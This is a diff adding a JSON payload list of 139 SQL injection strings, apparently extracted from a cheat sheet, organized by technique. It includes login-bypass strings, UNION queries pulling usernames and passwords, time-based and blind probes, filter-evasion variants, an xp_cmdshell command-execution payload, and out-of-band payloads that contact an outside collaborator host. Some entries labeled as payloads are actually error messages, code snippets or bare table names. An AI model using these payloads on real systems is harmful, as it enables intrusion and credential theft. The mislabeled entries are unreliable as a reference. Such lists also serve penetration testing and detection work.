@@ -1,0 +1,1307 @@
+[
+  {
+    "id": "sqli-1",
+    "title": "Entry Point Detection",
+    "payload": "+HERP",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-2",
+    "title": "Entry Point Detection",
+    "payload": "'||'DERP",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-3",
+    "title": "Entry Point Detection",
+    "payload": "'+'herp",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-4",
+    "title": "Entry Point Detection",
+    "payload": "' 'DERP",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-5",
+    "title": "Entry Point Detection",
+    "payload": "'%20'HERP",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-6",
+    "title": "Entry Point Detection",
+    "payload": "'%2B'HERP",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-7",
+    "title": "Entry Point Detection",
+    "payload": "page.asp?id=1 or 1=1 -- true",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-8",
+    "title": "Entry Point Detection",
+    "payload": "page.asp?id=1' or 1=1 -- true",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-9",
+    "title": "Entry Point Detection",
+    "payload": "page.asp?id=1\" or 1=1 -- true",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-10",
+    "title": "Entry Point Detection",
+    "payload": "page.asp?id=1 and 1=2 -- false",
+    "context": "Entry Point Detection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-11",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "conv('a',16,2)=conv('a',16,2)",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-12",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "connection_id()=connection_id()",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-13",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "crc32('MySQL')=crc32('MySQL')",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-14",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-15",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "@@CONNECTIONS>0",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-16",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "@@CONNECTIONS=@@CONNECTIONS",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-17",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "@@CPU_BUSY=@@CPU_BUSY",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-18",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "USER_ID(1)=USER_ID(1)",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-19",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "ROWNUM=ROWNUM",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-20",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "RAWTOHEX('AB')=RAWTOHEX('AB')",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-21",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "LNNVL(0=123)",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-22",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "5::int=5",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-23",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "5::integer=5",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-24",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "pg_client_encoding()=pg_client_encoding()",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-25",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "get_current_ts_config()=get_current_ts_config()",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-26",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "quote_literal(42.5)=quote_literal(42.5)",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-27",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "current_database()=current_database()",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-28",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "sqlite_version()=sqlite_version()",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-29",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "last_insert_rowid()>1",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-30",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "last_insert_rowid()=last_insert_rowid()",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-31",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "val(cvar(1))=1",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-32",
+    "title": "DBMS Identification Keyword Based",
+    "payload": "IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0",
+    "context": "DBMS Identification Keyword Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-33",
+    "title": "DBMS Identification Error Based",
+    "payload": "You have an error in your SQL syntax; ... near '' at line 1",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-34",
+    "title": "DBMS Identification Error Based",
+    "payload": "ERROR: unterminated quoted string at or near \"'\"",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-35",
+    "title": "DBMS Identification Error Based",
+    "payload": "ERROR: syntax error at or near \"1\"",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-36",
+    "title": "DBMS Identification Error Based",
+    "payload": "1'",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-37",
+    "title": "DBMS Identification Error Based",
+    "payload": "Unclosed quotation mark after the character string ''.",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-38",
+    "title": "DBMS Identification Error Based",
+    "payload": "Incorrect syntax near ''.",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-39",
+    "title": "DBMS Identification Error Based",
+    "payload": "The conversion of the varchar value to data type int resulted in an out-of-range value.",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-40",
+    "title": "DBMS Identification Error Based",
+    "payload": "ORA-00933: SQL command not properly ended",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-41",
+    "title": "DBMS Identification Error Based",
+    "payload": "ORA-01756: quoted string not properly terminated",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-42",
+    "title": "DBMS Identification Error Based",
+    "payload": "ORA-00923: FROM keyword not found where expected",
+    "context": "DBMS Identification Error Based",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-43",
+    "title": "Authentication Bypass",
+    "payload": "SELECT * FROM users WHERE username = 'user' AND password = 'pass';",
+    "context": "Authentication Bypass",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-44",
+    "title": "Authentication Bypass",
+    "payload": "' OR '1'='1'--",
+    "context": "Authentication Bypass",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-45",
+    "title": "Authentication Bypass",
+    "payload": "SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';",
+    "context": "Authentication Bypass",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-46",
+    "title": "Authentication Bypass",
+    "payload": "' or 1=1 limit 1 --",
+    "context": "Authentication Bypass",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-47",
+    "title": "Raw MD5 and SHA1",
+    "payload": "sql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-48",
+    "title": "Raw MD5 and SHA1",
+    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = '\".md5(\"ffifdyop\", true).\"'\";",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-49",
+    "title": "Raw MD5 and SHA1",
+    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b\u001c'\";",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-50",
+    "title": "Raw MD5 and SHA1",
+    "payload": "'or'6�]��!r,��b",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-51",
+    "title": "Raw MD5 and SHA1",
+    "payload": "'or'",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-52",
+    "title": "Raw MD5 and SHA1",
+    "payload": "ÚT0Do#ßÁ'or'8",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-53",
+    "title": "Raw MD5 and SHA1",
+    "payload": "Q�u'='�@�[�t�- o��_-!",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-54",
+    "title": "Raw MD5 and SHA1",
+    "payload": "'='",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-55",
+    "title": "Raw MD5 and SHA1",
+    "payload": "ÜÛ¾}_ia!8Wm'/*´Õ",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-56",
+    "title": "Raw MD5 and SHA1",
+    "payload": "'/*",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-57",
+    "title": "Raw MD5 and SHA1",
+    "payload": "Ùp2ûjww%6\\",
+    "context": "Raw MD5 and SHA1",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-58",
+    "title": "Hashed Passwords",
+    "payload": "admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",
+    "context": "Hashed Passwords",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-59",
+    "title": "Hashed Passwords",
+    "payload": "AND 1=0",
+    "context": "Hashed Passwords",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-60",
+    "title": "Hashed Passwords",
+    "payload": "SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'",
+    "context": "Hashed Passwords",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-61",
+    "title": "UNION Based Injection",
+    "payload": "SELECT product_name, product_price FROM products WHERE product_id = 'input_id';",
+    "context": "UNION Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-62",
+    "title": "UNION Based Injection",
+    "payload": "1' UNION SELECT username, password FROM users --",
+    "context": "UNION Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-63",
+    "title": "UNION Based Injection",
+    "payload": "SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';",
+    "context": "UNION Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-64",
+    "title": "Error Based Injection",
+    "payload": "LIMIT CAST((SELECT version()) as numeric)",
+    "context": "Error Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-65",
+    "title": "Error Based Injection",
+    "payload": "ERROR: invalid input syntax for type numeric: \"PostgreSQL 9.5.25 on x86_64-pc-linux-gnu\"",
+    "context": "Error Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-66",
+    "title": "Boolean Based Injection",
+    "payload": "http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)",
+    "context": "Boolean Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-67",
+    "title": "Boolean Based Injection",
+    "payload": "http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)",
+    "context": "Boolean Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-68",
+    "title": "Boolean Based Injection",
+    "payload": "http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)",
+    "context": "Boolean Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-69",
+    "title": "Boolean Based Injection",
+    "payload": "http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)",
+    "context": "Boolean Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-70",
+    "title": "Boolean Based Injection",
+    "payload": "http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)",
+    "context": "Boolean Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-71",
+    "title": "Boolean Based Injection",
+    "payload": "http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 --",
+    "context": "Boolean Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-72",
+    "title": "Boolean Based Injection",
+    "payload": "http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 --",
+    "context": "Boolean Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-73",
+    "title": "Blind Error Based Injection",
+    "payload": "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK",
+    "context": "Blind Error Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-74",
+    "title": "Blind Error Based Injection",
+    "payload": "' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON",
+    "context": "Blind Error Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-75",
+    "title": "Time Based Injection",
+    "payload": "' AND SLEEP(5)/*",
+    "context": "Time Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-76",
+    "title": "Time Based Injection",
+    "payload": "' AND '1'='1' AND SLEEP(5)",
+    "context": "Time Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-77",
+    "title": "Time Based Injection",
+    "payload": "' ; WAITFOR DELAY '00:00:05' --",
+    "context": "Time Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-78",
+    "title": "Time Based Injection",
+    "payload": "BENCHMARK(2000000,MD5(NOW()))",
+    "context": "Time Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-79",
+    "title": "Time Based Injection",
+    "payload": "http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --",
+    "context": "Time Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-80",
+    "title": "Out of Band (OAST)",
+    "payload": "LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')",
+    "context": "Out of Band (OAST)",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-81",
+    "title": "Out of Band (OAST)",
+    "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'",
+    "context": "Out of Band (OAST)",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-82",
+    "title": "Out of Band (OAST)",
+    "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
+    "context": "Out of Band (OAST)",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-83",
+    "title": "Out of Band (OAST)",
+    "payload": "exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'",
+    "context": "Out of Band (OAST)",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-84",
+    "title": "Stacked Based Injection",
+    "payload": "1; EXEC xp_cmdshell('whoami') --",
+    "context": "Stacked Based Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-85",
+    "title": "Polyglot Injection",
+    "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+    "context": "Polyglot Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-86",
+    "title": "Routed Injection",
+    "payload": "' union select 0x2720756e696f6e2073656c65637420312c3223#",
+    "context": "Routed Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-87",
+    "title": "Routed Injection",
+    "payload": "-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a",
+    "context": "Routed Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-88",
+    "title": "Second Order SQL Injection",
+    "payload": "Username: attacker'--",
+    "context": "Second Order SQL Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-89",
+    "title": "Second Order SQL Injection",
+    "payload": "Email: attacker@example.com",
+    "context": "Second Order SQL Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-90",
+    "title": "Second Order SQL Injection",
+    "payload": "INSERT INTO users (username, email) VALUES ('attacker\\'--', 'attacker@example.com');",
+    "context": "Second Order SQL Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-91",
+    "title": "Second Order SQL Injection",
+    "payload": "query = \"SELECT * FROM logs WHERE username = '\" + user_from_db + \"'\"",
+    "context": "Second Order SQL Injection",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-92",
+    "title": "PDO Prepared Statements",
+    "payload": "$stmt->execute([$_GET['name']]);",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-93",
+    "title": "PDO Prepared Statements",
+    "payload": "$stmt->execute(['name' => $_GET['name']]);",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-94",
+    "title": "PDO Prepared Statements",
+    "payload": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-95",
+    "title": "PDO Prepared Statements",
+    "payload": "Column not found: 1054 Unknown column ''x' in 'SELECT'",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-96",
+    "title": "PDO Prepared Statements",
+    "payload": "ALL_PLUGINS",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-97",
+    "title": "PDO Prepared Statements",
+    "payload": "APPLICABLE_ROLES",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-98",
+    "title": "PDO Prepared Statements",
+    "payload": "CHARACTER_SETS",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-99",
+    "title": "PDO Prepared Statements",
+    "payload": "CHECK_CONSTRAINTS",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-100",
+    "title": "PDO Prepared Statements",
+    "payload": "COLLATIONS",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-101",
+    "title": "PDO Prepared Statements",
+    "payload": "COLLATION_CHARACTER_SET_APPLICABILITY",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-102",
+    "title": "PDO Prepared Statements",
+    "payload": "COLUMNS",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-103",
+    "title": "PDO Prepared Statements",
+    "payload": "SELECT `\\?#\\0` FROM animals WHERE name = ?",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-104",
+    "title": "PDO Prepared Statements",
+    "payload": "SELECT `\\'x` FROM (SELECT table_name AS `\\'x` from information_schema.tables)y;#'#\\0` FROM animals WHERE name = ?",
+    "context": "PDO Prepared Statements",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-105",
+    "title": "Alternative Whitespace Characters",
+    "payload": "?id=1%09and%091=1%09--",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-106",
+    "title": "Alternative Whitespace Characters",
+    "payload": "%09",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-107",
+    "title": "Alternative Whitespace Characters",
+    "payload": "\\t",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-108",
+    "title": "Alternative Whitespace Characters",
+    "payload": "?id=1%0Aand%0A1=1%0A--",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-109",
+    "title": "Alternative Whitespace Characters",
+    "payload": "%0A",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-110",
+    "title": "Alternative Whitespace Characters",
+    "payload": "\\n",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-111",
+    "title": "Alternative Whitespace Characters",
+    "payload": "?id=1%0Band%0B1=1%0B--",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-112",
+    "title": "Alternative Whitespace Characters",
+    "payload": "%0B",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-113",
+    "title": "Alternative Whitespace Characters",
+    "payload": "?id=1%0Cand%0C1=1%0C--",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-114",
+    "title": "Alternative Whitespace Characters",
+    "payload": "%0C",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-115",
+    "title": "Alternative Whitespace Characters",
+    "payload": "?id=1%0Dand%0D1=1%0D--",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-116",
+    "title": "Alternative Whitespace Characters",
+    "payload": "%0D",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-117",
+    "title": "Alternative Whitespace Characters",
+    "payload": "\\r",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-118",
+    "title": "Alternative Whitespace Characters",
+    "payload": "?id=1%A0and%A01=1%A0--",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-119",
+    "title": "Alternative Whitespace Characters",
+    "payload": "%A0",
+    "context": "Alternative Whitespace Characters",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-120",
+    "title": "Bypassing with Comments and Parentheses",
+    "payload": "?id=1/*comment*/AND/**/1=1/**/--",
+    "context": "Bypassing with Comments and Parentheses",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-121",
+    "title": "Bypassing with Comments and Parentheses",
+    "payload": "?id=1/*!12345UNION*//*!12345SELECT*/1--",
+    "context": "Bypassing with Comments and Parentheses",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-122",
+    "title": "Bypassing with Comments and Parentheses",
+    "payload": "?id=(1)and(1)=(1)--",
+    "context": "Bypassing with Comments and Parentheses",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-123",
+    "title": "No Comma Allowed",
+    "payload": "LIMIT 0,1",
+    "context": "No Comma Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-124",
+    "title": "No Comma Allowed",
+    "payload": "LIMIT 1 OFFSET 0",
+    "context": "No Comma Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-125",
+    "title": "No Comma Allowed",
+    "payload": "SUBSTR('SQL',1,1)",
+    "context": "No Comma Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-126",
+    "title": "No Comma Allowed",
+    "payload": "SUBSTR('SQL' FROM 1 FOR 1)",
+    "context": "No Comma Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-127",
+    "title": "No Comma Allowed",
+    "payload": "SELECT 1,2,3,4",
+    "context": "No Comma Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-128",
+    "title": "No Comma Allowed",
+    "payload": "UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d",
+    "context": "No Comma Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-129",
+    "title": "No Equal Allowed",
+    "payload": "LIKE",
+    "context": "No Equal Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-130",
+    "title": "No Equal Allowed",
+    "payload": "SUBSTRING(VERSION(),1,1)LIKE(5)",
+    "context": "No Equal Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-131",
+    "title": "No Equal Allowed",
+    "payload": "NOT IN",
+    "context": "No Equal Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-132",
+    "title": "No Equal Allowed",
+    "payload": "SUBSTRING(VERSION(),1,1)NOT IN(4,3)",
+    "context": "No Equal Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-133",
+    "title": "No Equal Allowed",
+    "payload": "IN",
+    "context": "No Equal Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-134",
+    "title": "No Equal Allowed",
+    "payload": "SUBSTRING(VERSION(),1,1)IN(4,3)",
+    "context": "No Equal Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-135",
+    "title": "No Equal Allowed",
+    "payload": "BETWEEN",
+    "context": "No Equal Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-136",
+    "title": "No Equal Allowed",
+    "payload": "SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4",
+    "context": "No Equal Allowed",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-137",
+    "title": "Case Modification",
+    "payload": "AND",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-138",
+    "title": "Case Modification",
+    "payload": "and",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-139",
+    "title": "Case Modification",
+    "payload": "aNd",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  },
